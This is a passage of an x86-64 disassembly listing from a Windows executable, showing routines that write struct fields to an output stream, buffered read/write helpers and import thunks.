   140008060:	48 8d 15 d1 36 00 00 	lea    0x36d1(%rip),%rdx        # 0x14000b738
   140008067:	48 8b c8             	mov    %rax,%rcx
   14000806a:	e8 e1 8f ff ff       	call   0x140001050
   14000806f:	90                   	nop
   140008070:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   140008074:	48 83 fa 0f          	cmp    $0xf,%rdx
   140008078:	76 46                	jbe    0x1400080c0
   14000807a:	48 ff c2             	inc    %rdx
   14000807d:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140008081:	48 8b c1             	mov    %rcx,%rax
   140008084:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000808b:	72 2e                	jb     0x1400080bb
   14000808d:	48 83 c2 27          	add    $0x27,%rdx
   140008091:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140008095:	48 2b c1             	sub    %rcx,%rax
   140008098:	48 83 e8 08          	sub    $0x8,%rax
   14000809c:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400080a0:	76 19                	jbe    0x1400080bb
   1400080a2:	45 33 f6             	xor    %r14d,%r14d
   1400080a5:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400080aa:	45 33 c9             	xor    %r9d,%r9d
   1400080ad:	45 33 c0             	xor    %r8d,%r8d
   1400080b0:	33 d2                	xor    %edx,%edx
   1400080b2:	33 c9                	xor    %ecx,%ecx
   1400080b4:	ff 15 ae 23 00 00    	call   *0x23ae(%rip)        # 0x14000a468
   1400080ba:	cc                   	int3
   1400080bb:	e8 18 07 00 00       	call   0x1400087d8
   1400080c0:	48 8d 15 b1 36 00 00 	lea    0x36b1(%rip),%rdx        # 0x14000b778
   1400080c7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400080cc:	e8 7f 8f ff ff       	call   0x140001050
   1400080d1:	45 33 f6             	xor    %r14d,%r14d
   1400080d4:	45 8b ee             	mov    %r14d,%r13d
   1400080d7:	4c 8b 3f             	mov    (%rdi),%r15
   1400080da:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400080de:	49 2b cf             	sub    %r15,%rcx
   1400080e1:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   1400080e8:	66 66 66 
   1400080eb:	48 f7 e9             	imul   %rcx
   1400080ee:	48 c1 fa 04          	sar    $0x4,%rdx
   1400080f2:	48 8b c2             	mov    %rdx,%rax
   1400080f5:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400080f9:	48 03 d0             	add    %rax,%rdx
   1400080fc:	0f 84 50 01 00 00    	je     0x140008252
   140008102:	45 8b e6             	mov    %r14d,%r12d
   140008105:	48 bb 67 66 66 66 66 	movabs $0x6666666666666667,%rbx
   14000810c:	66 66 66 
   14000810f:	90                   	nop
   140008110:	48 8d 15 75 36 00 00 	lea    0x3675(%rip),%rdx        # 0x14000b78c
   140008117:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000811c:	e8 2f 8f ff ff       	call   0x140001050
   140008121:	48 8d 15 70 36 00 00 	lea    0x3670(%rip),%rdx        # 0x14000b798
   140008128:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000812d:	e8 1e 8f ff ff       	call   0x140001050
   140008132:	4b 8b 14 27          	mov    (%r15,%r12,1),%rdx
   140008136:	48 8b c8             	mov    %rax,%rcx
   140008139:	e8 12 8f ff ff       	call   0x140001050
   14000813e:	48 8b c8             	mov    %rax,%rcx
   140008141:	48 8d 15 f0 35 00 00 	lea    0x35f0(%rip),%rdx        # 0x14000b738
   140008148:	e8 03 8f ff ff       	call   0x140001050
   14000814d:	48 8d 15 54 36 00 00 	lea    0x3654(%rip),%rdx        # 0x14000b7a8
   140008154:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008159:	e8 f2 8e ff ff       	call   0x140001050
   14000815e:	4b 8b 54 27 08       	mov    0x8(%r15,%r12,1),%rdx
   140008163:	48 8b c8             	mov    %rax,%rcx
   140008166:	e8 e5 8e ff ff       	call   0x140001050
   14000816b:	48 8b c8             	mov    %rax,%rcx
   14000816e:	48 8d 15 c3 35 00 00 	lea    0x35c3(%rip),%rdx        # 0x14000b738
   140008175:	e8 d6 8e ff ff       	call   0x140001050
   14000817a:	48 8d 15 3f 36 00 00 	lea    0x363f(%rip),%rdx        # 0x14000b7c0
   140008181:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008186:	e8 c5 8e ff ff       	call   0x140001050
   14000818b:	48 8d 15 1e 9e ff ff 	lea    -0x61e2(%rip),%rdx        # 0x140001fb0
   140008192:	48 8b c8             	mov    %rax,%rcx
   140008195:	ff 15 3d 1f 00 00    	call   *0x1f3d(%rip)        # 0x14000a0d8
   14000819b:	4b 8b 54 27 20       	mov    0x20(%r15,%r12,1),%rdx
   1400081a0:	48 8b c8             	mov    %rax,%rcx
   1400081a3:	ff 15 37 1f 00 00    	call   *0x1f37(%rip)        # 0x14000a0e0
   1400081a9:	48 8d 15 d0 9d ff ff 	lea    -0x6230(%rip),%rdx        # 0x140001f80
   1400081b0:	48 8b c8             	mov    %rax,%rcx
   1400081b3:	ff 15 1f 1f 00 00    	call   *0x1f1f(%rip)        # 0x14000a0d8
   1400081b9:	48 8b c8             	mov    %rax,%rcx
   1400081bc:	48 8d 15 f9 35 00 00 	lea    0x35f9(%rip),%rdx        # 0x14000b7bc
   1400081c3:	e8 88 8e ff ff       	call   0x140001050
   1400081c8:	48 8d 15 09 36 00 00 	lea    0x3609(%rip),%rdx        # 0x14000b7d8
   1400081cf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400081d4:	e8 77 8e ff ff       	call   0x140001050
   1400081d9:	4d 8d 45 01          	lea    0x1(%r13),%r8
   1400081dd:	4d 8b e8             	mov    %r8,%r13
   1400081e0:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400081e4:	48 2b 0f             	sub    (%rdi),%rcx
   1400081e7:	48 8b c3             	mov    %rbx,%rax
   1400081ea:	48 f7 e9             	imul   %rcx
   1400081ed:	48 c1 fa 04          	sar    $0x4,%rdx
   1400081f1:	48 8b c2             	mov    %rdx,%rax
   1400081f4:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400081f8:	48 03 d0             	add    %rax,%rdx
   1400081fb:	4c 3b c2             	cmp    %rdx,%r8
   1400081fe:	73 11                	jae    0x140008211
   140008200:	48 8d 15 f5 34 00 00 	lea    0x34f5(%rip),%rdx        # 0x14000b6fc
   140008207:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000820c:	e8 3f 8e ff ff       	call   0x140001050
   140008211:	48 8d 15 90 24 00 00 	lea    0x2490(%rip),%rdx        # 0x14000a6a8
   140008218:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000821d:	e8 2e 8e ff ff       	call   0x140001050
   140008222:	49 83 c4 28          	add    $0x28,%r12
   140008226:	4c 8b 3f             	mov    (%rdi),%r15
   140008229:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000822d:	49 2b cf             	sub    %r15,%rcx
   140008230:	48 8b c3             	mov    %rbx,%rax
   140008233:	48 f7 e9             	imul   %rcx
   140008236:	48 c1 fa 04          	sar    $0x4,%rdx
   14000823a:	48 8b c2             	mov    %rdx,%rax
   14000823d:	48 c1 e8 3f          	shr    $0x3f,%rax
   140008241:	48 03 d0             	add    %rax,%rdx
   140008244:	4c 3b ea             	cmp    %rdx,%r13
   140008247:	0f 82 c3 fe ff ff    	jb     0x140008110
   14000824d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008252:	48 8d 15 87 35 00 00 	lea    0x3587(%rip),%rdx        # 0x14000b7e0
   140008259:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000825e:	e8 ed 8d ff ff       	call   0x140001050
   140008263:	48 8d 15 7e 35 00 00 	lea    0x357e(%rip),%rdx        # 0x14000b7e8
   14000826a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000826f:	e8 dc 8d ff ff       	call   0x140001050
   140008274:	48 8b 3e             	mov    (%rsi),%rdi
   140008277:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   14000827b:	48 2b cf             	sub    %rdi,%rcx
   14000827e:	49 bc ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%r12
   140008285:	aa aa 2a 
   140008288:	49 8b c4             	mov    %r12,%rax
   14000828b:	48 f7 e9             	imul   %rcx
   14000828e:	48 c1 fa 02          	sar    $0x2,%rdx
   140008292:	48 8b c2             	mov    %rdx,%rax
   140008295:	48 c1 e8 3f          	shr    $0x3f,%rax
   140008299:	48 03 d0             	add    %rax,%rdx
   14000829c:	0f 84 4b 01 00 00    	je     0x1400083ed
   1400082a2:	4d 8b fe             	mov    %r14,%r15
   1400082a5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400082ac:	00 00 00 00 
   1400082b0:	48 8d 15 d5 34 00 00 	lea    0x34d5(%rip),%rdx        # 0x14000b78c
   1400082b7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400082bc:	e8 8f 8d ff ff       	call   0x140001050
   1400082c1:	48 8d 15 30 35 00 00 	lea    0x3530(%rip),%rdx        # 0x14000b7f8
   1400082c8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400082cd:	e8 7e 8d ff ff       	call   0x140001050
   1400082d2:	4a 8b 14 3f          	mov    (%rdi,%r15,1),%rdx
   1400082d6:	48 8b c8             	mov    %rax,%rcx
   1400082d9:	e8 72 8d ff ff       	call   0x140001050
   1400082de:	48 8b c8             	mov    %rax,%rcx
   1400082e1:	48 8d 15 50 34 00 00 	lea    0x3450(%rip),%rdx        # 0x14000b738
   1400082e8:	e8 63 8d ff ff       	call   0x140001050
   1400082ed:	48 8d 15 a4 34 00 00 	lea    0x34a4(%rip),%rdx        # 0x14000b798
   1400082f4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400082f9:	e8 52 8d ff ff       	call   0x140001050
   1400082fe:	4a 8b 54 3f 08       	mov    0x8(%rdi,%r15,1),%rdx
   140008303:	48 8b c8             	mov    %rax,%rcx
   140008306:	e8 45 8d ff ff       	call   0x140001050
   14000830b:	48 8b c8             	mov    %rax,%rcx
   14000830e:	48 8d 15 23 34 00 00 	lea    0x3423(%rip),%rdx        # 0x14000b738
   140008315:	e8 36 8d ff ff       	call   0x140001050
   14000831a:	48 8d 15 ef 34 00 00 	lea    0x34ef(%rip),%rdx        # 0x14000b810
   140008321:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008326:	e8 25 8d ff ff       	call   0x140001050
   14000832b:	48 8d 15 7e 9c ff ff 	lea    -0x6382(%rip),%rdx        # 0x140001fb0
   140008332:	48 8b c8             	mov    %rax,%rcx
   140008335:	ff 15 9d 1d 00 00    	call   *0x1d9d(%rip)        # 0x14000a0d8
   14000833b:	42 8b 54 3f 10       	mov    0x10(%rdi,%r15,1),%edx
   140008340:	48 8b c8             	mov    %rax,%rcx
   140008343:	ff 15 e7 1e 00 00    	call   *0x1ee7(%rip)        # 0x14000a230
   140008349:	48 8d 15 30 9c ff ff 	lea    -0x63d0(%rip),%rdx        # 0x140001f80
   140008350:	48 8b c8             	mov    %rax,%rcx
   140008353:	ff 15 7f 1d 00 00    	call   *0x1d7f(%rip)        # 0x14000a0d8
   140008359:	48 8b c8             	mov    %rax,%rcx
   14000835c:	48 8d 15 59 34 00 00 	lea    0x3459(%rip),%rdx        # 0x14000b7bc
   140008363:	e8 e8 8c ff ff       	call   0x140001050
   140008368:	48 8d 15 69 34 00 00 	lea    0x3469(%rip),%rdx        # 0x14000b7d8
   14000836f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008374:	e8 d7 8c ff ff       	call   0x140001050
   140008379:	4d 8d 46 01          	lea    0x1(%r14),%r8
   14000837d:	4d 8b f0             	mov    %r8,%r14
   140008380:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   140008384:	48 2b 0e             	sub    (%rsi),%rcx
   140008387:	49 8b c4             	mov    %r12,%rax
   14000838a:	48 f7 e9             	imul   %rcx
   14000838d:	48 c1 fa 02          	sar    $0x2,%rdx
   140008391:	48 8b c2             	mov    %rdx,%rax
   140008394:	48 c1 e8 3f          	shr    $0x3f,%rax
   140008398:	48 03 d0             	add    %rax,%rdx
   14000839b:	4c 3b c2             	cmp    %rdx,%r8
   14000839e:	73 11                	jae    0x1400083b1
   1400083a0:	48 8d 15 55 33 00 00 	lea    0x3355(%rip),%rdx        # 0x14000b6fc
   1400083a7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400083ac:	e8 9f 8c ff ff       	call   0x140001050
   1400083b1:	48 8d 15 f0 22 00 00 	lea    0x22f0(%rip),%rdx        # 0x14000a6a8
   1400083b8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400083bd:	e8 8e 8c ff ff       	call   0x140001050
   1400083c2:	49 83 c7 18          	add    $0x18,%r15
   1400083c6:	48 8b 3e             	mov    (%rsi),%rdi
   1400083c9:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   1400083cd:	48 2b cf             	sub    %rdi,%rcx
   1400083d0:	49 8b c4             	mov    %r12,%rax
   1400083d3:	48 f7 e9             	imul   %rcx
   1400083d6:	48 c1 fa 02          	sar    $0x2,%rdx
   1400083da:	48 8b c2             	mov    %rdx,%rax
   1400083dd:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400083e1:	48 03 d0             	add    %rax,%rdx
   1400083e4:	4c 3b f2             	cmp    %rdx,%r14
   1400083e7:	0f 82 c3 fe ff ff    	jb     0x1400082b0
   1400083ed:	48 8d 15 30 34 00 00 	lea    0x3430(%rip),%rdx        # 0x14000b824
   1400083f4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400083f9:	e8 52 8c ff ff       	call   0x140001050
   1400083fe:	48 8d 15 17 33 00 00 	lea    0x3317(%rip),%rdx        # 0x14000b71c
   140008405:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000840a:	e8 41 8c ff ff       	call   0x140001050
   14000840f:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140008414:	e8 97 db ff ff       	call   0x140005fb0
   140008419:	48 85 c0             	test   %rax,%rax
   14000841c:	75 1f                	jne    0x14000843d
   14000841e:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140008423:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140008427:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000842c:	48 03 c8             	add    %rax,%rcx
   14000842f:	45 33 c0             	xor    %r8d,%r8d
   140008432:	ba 02 00 00 00       	mov    $0x2,%edx
   140008437:	ff 15 6b 1e 00 00    	call   *0x1e6b(%rip)        # 0x14000a2a8
   14000843d:	48 8d 15 ec 33 00 00 	lea    0x33ec(%rip),%rdx        # 0x14000b830
   140008444:	48 8b 0d a5 1c 00 00 	mov    0x1ca5(%rip),%rcx        # 0x14000a0f0
   14000844b:	e8 00 8c ff ff       	call   0x140001050
   140008450:	4c 8b 43 10          	mov    0x10(%rbx),%r8
   140008454:	48 83 7b 18 0f       	cmpq   $0xf,0x18(%rbx)
   140008459:	76 03                	jbe    0x14000845e
   14000845b:	48 8b 1b             	mov    (%rbx),%rbx
   14000845e:	48 8b d3             	mov    %rbx,%rdx
   140008461:	48 8b c8             	mov    %rax,%rcx
   140008464:	e8 67 92 ff ff       	call   0x1400016d0
   140008469:	48 8d 15 38 22 00 00 	lea    0x2238(%rip),%rdx        # 0x14000a6a8
   140008470:	48 8b c8             	mov    %rax,%rcx
   140008473:	e8 d8 8b ff ff       	call   0x140001050
   140008478:	90                   	nop
   140008479:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000847e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140008482:	48 8d 05 a7 31 00 00 	lea    0x31a7(%rip),%rax        # 0x14000b630
   140008489:	48 89 44 0c 40       	mov    %rax,0x40(%rsp,%rcx,1)
   14000848e:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140008493:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140008497:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   14000849d:	89 54 0c 3c          	mov    %edx,0x3c(%rsp,%rcx,1)
   1400084a1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400084a6:	e8 45 d5 ff ff       	call   0x1400059f0
   1400084ab:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400084b0:	ff 15 72 1d 00 00    	call   *0x1d72(%rip)        # 0x14000a228
   1400084b6:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   1400084ba:	ff 15 50 1d 00 00    	call   *0x1d50(%rip)        # 0x14000a210
   1400084c0:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400084c4:	48 33 cc             	xor    %rsp,%rcx
   1400084c7:	e8 a4 03 00 00       	call   0x140008870
   1400084cc:	48 8b 9c 24 d8 01 00 	mov    0x1d8(%rsp),%rbx
   1400084d3:	00 
   1400084d4:	48 81 c4 80 01 00 00 	add    $0x180,%rsp
   1400084db:	41 5f                	pop    %r15
   1400084dd:	41 5e                	pop    %r14
   1400084df:	41 5d                	pop    %r13
   1400084e1:	41 5c                	pop    %r12
   1400084e3:	5f                   	pop    %rdi
   1400084e4:	5e                   	pop    %rsi
   1400084e5:	5d                   	pop    %rbp
   1400084e6:	c3                   	ret
   1400084e7:	cc                   	int3
   1400084e8:	cc                   	int3
   1400084e9:	cc                   	int3
   1400084ea:	cc                   	int3
   1400084eb:	cc                   	int3
   1400084ec:	cc                   	int3
   1400084ed:	cc                   	int3
   1400084ee:	cc                   	int3
   1400084ef:	cc                   	int3
   1400084f0:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400084f5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400084fa:	41 56                	push   %r14
   1400084fc:	48 83 ec 20          	sub    $0x20,%rsp
   140008500:	49 8b f0             	mov    %r8,%rsi
   140008503:	48 8b ea             	mov    %rdx,%rbp
   140008506:	4c 8b f1             	mov    %rcx,%r14
   140008509:	4d 85 c0             	test   %r8,%r8
   14000850c:	7f 13                	jg     0x140008521
   14000850e:	33 c0                	xor    %eax,%eax
   140008510:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140008515:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000851a:	48 83 c4 20          	add    $0x20,%rsp
   14000851e:	41 5e                	pop    %r14
   140008520:	c3                   	ret
   140008521:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140008526:	74 17                	je     0x14000853f
   140008528:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   14000852d:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008532:	48 83 c4 20          	add    $0x20,%rsp
   140008536:	41 5e                	pop    %r14
   140008538:	48 ff 25 b9 1c 00 00 	rex.W jmp *0x1cb9(%rip)        # 0x14000a1f8
   14000853f:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140008544:	48 8b de             	mov    %rsi,%rbx
   140008547:	ff 15 6b 1c 00 00    	call   *0x1c6b(%rip)        # 0x14000a1b8
   14000854d:	48 85 c0             	test   %rax,%rax
   140008550:	74 3c                	je     0x14000858e
   140008552:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140008557:	48 3b c6             	cmp    %rsi,%rax
   14000855a:	48 8b fe             	mov    %rsi,%rdi
   14000855d:	49 8b ce             	mov    %r14,%rcx
   140008560:	48 0f 42 f8          	cmovb  %rax,%rdi
   140008564:	ff 15 06 1c 00 00    	call   *0x1c06(%rip)        # 0x14000a170
   14000856a:	4c 8b c7             	mov    %rdi,%r8
   14000856d:	48 8b cd             	mov    %rbp,%rcx
   140008570:	48 8b d0             	mov    %rax,%rdx
   140008573:	e8 cc 10 00 00       	call   0x140009644
   140008578:	8b d7                	mov    %edi,%edx
   14000857a:	49 8b ce             	mov    %r14,%rcx
   14000857d:	48 03 ef             	add    %rdi,%rbp
   140008580:	48 2b df             	sub    %rdi,%rbx
   140008583:	ff 15 07 1c 00 00    	call   *0x1c07(%rip)        # 0x14000a190
   140008589:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   14000858e:	49 83 be 80 00 00 00 	cmpq   $0x0,0x80(%r14)
   140008595:	00 
   140008596:	74 66                	je     0x1400085fe
   140008598:	49 8b ce             	mov    %r14,%rcx
   14000859b:	e8 90 d9 ff ff       	call   0x140005f30
   1400085a0:	48 81 fb ff 0f 00 00 	cmp    $0xfff,%rbx
   1400085a7:	76 35                	jbe    0x1400085de
   1400085a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400085b0:	4d 8b 8e 80 00 00 00 	mov    0x80(%r14),%r9
   1400085b7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400085bc:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   1400085c2:	48 8b cd             	mov    %rbp,%rcx
   1400085c5:	ff 15 f5 1e 00 00    	call   *0x1ef5(%rip)        # 0x14000a4c0
   1400085cb:	48 03 e8             	add    %rax,%rbp
   1400085ce:	48 2b d8             	sub    %rax,%rbx
   1400085d1:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   1400085d7:	75 25                	jne    0x1400085fe
   1400085d9:	48 3b d8             	cmp    %rax,%rbx
   1400085dc:	77 d2                	ja     0x1400085b0
   1400085de:	48 85 db             	test   %rbx,%rbx
   1400085e1:	74 1b                	je     0x1400085fe
   1400085e3:	4d 8b 8e 80 00 00 00 	mov    0x80(%r14),%r9
   1400085ea:	4c 8b c3             	mov    %rbx,%r8
   1400085ed:	ba 01 00 00 00       	mov    $0x1,%edx
   1400085f2:	48 8b cd             	mov    %rbp,%rcx
   1400085f5:	ff 15 c5 1e 00 00    	call   *0x1ec5(%rip)        # 0x14000a4c0
   1400085fb:	48 2b d8             	sub    %rax,%rbx
   1400085fe:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140008603:	48 2b f3             	sub    %rbx,%rsi
   140008606:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000860b:	48 8b c6             	mov    %rsi,%rax
   14000860e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008613:	48 83 c4 20          	add    $0x20,%rsp
   140008617:	41 5e                	pop    %r14
   140008619:	c3                   	ret
   14000861a:	cc                   	int3
   14000861b:	cc                   	int3
   14000861c:	cc                   	int3
   14000861d:	cc                   	int3
   14000861e:	cc                   	int3
   14000861f:	cc                   	int3
   140008620:	40 53                	rex push %rbx
   140008622:	57                   	push   %rdi
   140008623:	41 56                	push   %r14
   140008625:	48 83 ec 20          	sub    $0x20,%rsp
   140008629:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000862e:	49 8b d8             	mov    %r8,%rbx
   140008631:	4c 8b f2             	mov    %rdx,%r14
   140008634:	48 8b f9             	mov    %rcx,%rdi
   140008637:	74 0f                	je     0x140008648
   140008639:	48 83 c4 20          	add    $0x20,%rsp
   14000863d:	41 5e                	pop    %r14
   14000863f:	5f                   	pop    %rdi
   140008640:	5b                   	pop    %rbx
   140008641:	48 ff 25 b8 1b 00 00 	rex.W jmp *0x1bb8(%rip)        # 0x14000a200
   140008648:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   14000864d:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140008652:	48 8b f3             	mov    %rbx,%rsi
   140008655:	ff 15 85 1b 00 00    	call   *0x1b85(%rip)        # 0x14000a1e0
   14000865b:	48 8b e8             	mov    %rax,%rbp
   14000865e:	48 85 db             	test   %rbx,%rbx
   140008661:	7e 59                	jle    0x1400086bc
   140008663:	48 85 c0             	test   %rax,%rax
   140008666:	7e 34                	jle    0x14000869c
   140008668:	48 3b d8             	cmp    %rax,%rbx
   14000866b:	48 8b cf             	mov    %rdi,%rcx
   14000866e:	48 0f 4c eb          	cmovl  %rbx,%rbp
   140008672:	ff 15 08 1b 00 00    	call   *0x1b08(%rip)        # 0x14000a180
   140008678:	4c 8b c5             	mov    %rbp,%r8
   14000867b:	49 8b d6             	mov    %r14,%rdx
   14000867e:	48 8b c8             	mov    %rax,%rcx
   140008681:	e8 be 0f 00 00       	call   0x140009644
   140008686:	8b d5                	mov    %ebp,%edx
   140008688:	48 8b cf             	mov    %rdi,%rcx
   14000868b:	48 2b dd             	sub    %rbp,%rbx
   14000868e:	ff 15 2c 1b 00 00    	call   *0x1b2c(%rip)        # 0x14000a1c0
   140008694:	4c 03 f5             	add    %rbp,%r14
   140008697:	48 85 db             	test   %rbx,%rbx
   14000869a:	7e 20                	jle    0x1400086bc
   14000869c:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   1400086a3:	4d 85 c9             	test   %r9,%r9
   1400086a6:	74 14                	je     0x1400086bc
   1400086a8:	4c 8b c3             	mov    %rbx,%r8
   1400086ab:	ba 01 00 00 00       	mov    $0x1,%edx
   1400086b0:	49 8b ce             	mov    %r14,%rcx
   1400086b3:	ff 15 37 1e 00 00    	call   *0x1e37(%rip)        # 0x14000a4f0
   1400086b9:	48 2b d8             	sub    %rax,%rbx
   1400086bc:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400086c1:	48 2b f3             	sub    %rbx,%rsi
   1400086c4:	48 8b c6             	mov    %rsi,%rax
   1400086c7:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400086cc:	48 83 c4 20          	add    $0x20,%rsp
   1400086d0:	41 5e                	pop    %r14
   1400086d2:	5f                   	pop    %rdi
   1400086d3:	5b                   	pop    %rbx
   1400086d4:	c3                   	ret
   1400086d5:	ff 25 5d 19 00 00    	jmp    *0x195d(%rip)        # 0x14000a038
   1400086db:	ff 25 5f 19 00 00    	jmp    *0x195f(%rip)        # 0x14000a040
   1400086e1:	ff 25 61 19 00 00    	jmp    *0x1961(%rip)        # 0x14000a048
   1400086e7:	ff 25 63 19 00 00    	jmp    *0x1963(%rip)        # 0x14000a050
   1400086ed:	ff 25 65 19 00 00    	jmp    *0x1965(%rip)        # 0x14000a058
   1400086f3:	ff 25 67 19 00 00    	jmp    *0x1967(%rip)        # 0x14000a060
   1400086f9:	ff 25 01 1c 00 00    	jmp    *0x1c01(%rip)        # 0x14000a300
   1400086ff:	ff 25 f3 1b 00 00    	jmp    *0x1bf3(%rip)        # 0x14000a2f8
   140008705:	ff 25 fd 19 00 00    	jmp    *0x19fd(%rip)        # 0x14000a108
   14000870b:	ff 25 ff 19 00 00    	jmp    *0x19ff(%rip)        # 0x14000a110
   140008711:	cc                   	int3
   140008712:	cc                   	int3
   140008713:	cc                   	int3
   140008714:	40 53                	rex push %rbx
   140008716:	48 83 ec 20          	sub    $0x20,%rsp
   14000871a:	48 8b d9             	mov    %rcx,%rbx
   14000871d:	b9 10 00 00 00       	mov    $0x10,%ecx
   140008722:	ff 15 88 1c 00 00    	call   *0x1c88(%rip)        # 0x14000a3b0
   140008728:	48 8b d0             	mov    %rax,%rdx
   14000872b:	48 85 c0             	test   %rax,%rax
   14000872e:	74 1b                	je     0x14000874b
   140008730:	48 8b 05 c1 a8 00 00 	mov    0xa8c1(%rip),%rax        # 0x140012ff8
   140008737:	48 89 02             	mov    %rax,(%rdx)
   14000873a:	48 89 5a 08          	mov    %rbx,0x8(%rdx)
   14000873e:	48 89 15 b3 a8 00 00 	mov    %rdx,0xa8b3(%rip)        # 0x140012ff8
   140008745:	48 83 c4 20          	add    $0x20,%rsp
   140008749:	5b                   	pop    %rbx
   14000874a:	c3                   	ret
   14000874b:	e8 bb ff ff ff       	call   0x14000870b
   140008750:	cc                   	int3
   140008751:	ff 25 c1 19 00 00    	jmp    *0x19c1(%rip)        # 0x14000a118
   140008757:	ff 25 9b 1a 00 00    	jmp    *0x1a9b(%rip)        # 0x14000a1f8
   14000875d:	ff 25 9d 1a 00 00    	jmp    *0x1a9d(%rip)        # 0x14000a200
   140008763:	ff 25 9f 1a 00 00    	jmp    *0x1a9f(%rip)        # 0x14000a208
   140008769:	ff 25 d9 1a 00 00    	jmp    *0x1ad9(%rip)        # 0x14000a248
   14000876f:	ff 25 db 1a 00 00    	jmp    *0x1adb(%rip)        # 0x14000a250
   140008775:	ff 25 dd 1a 00 00    	jmp    *0x1add(%rip)        # 0x14000a258
   14000877b:	ff 25 df 1a 00 00    	jmp    *0x1adf(%rip)        # 0x14000a260
   140008781:	ff 25 e1 1a 00 00    	jmp    *0x1ae1(%rip)        # 0x14000a268
   140008787:	ff 25 e3 1a 00 00    	jmp    *0x1ae3(%rip)        # 0x14000a270
   14000878d:	ff 25 e5 1a 00 00    	jmp    *0x1ae5(%rip)        # 0x14000a278
   140008793:	ff 25 e7 1a 00 00    	jmp    *0x1ae7(%rip)        # 0x14000a280
   140008799:	cc                   	int3
   14000879a:	cc                   	int3
   14000879b:	cc                   	int3
   14000879c:	40 53                	rex push %rbx
   14000879e:	48 83 ec 20          	sub    $0x20,%rsp
   1400087a2:	48 8b d9             	mov    %rcx,%rbx
   1400087a5:	eb 0f                	jmp    0x1400087b6
   1400087a7:	48 8b cb             	mov    %rbx,%rcx
   1400087aa:	e8 d1 0e 00 00       	call   0x140009680
   1400087af:	85 c0                	test   %eax,%eax
   1400087b1:	74 13                	je     0x1400087c6
   1400087b3:	48 8b cb             	mov    %rbx,%rcx
   1400087b6:	e8 bf 0e 00 00       	call   0x14000967a
   1400087bb:	48 85 c0             	test   %rax,%rax
   1400087be:	74 e7                	je     0x1400087a7
   1400087c0:	48 83 c4 20          	add    $0x20,%rsp
   1400087c4:	5b                   	pop    %rbx
   1400087c5:	c3                   	ret
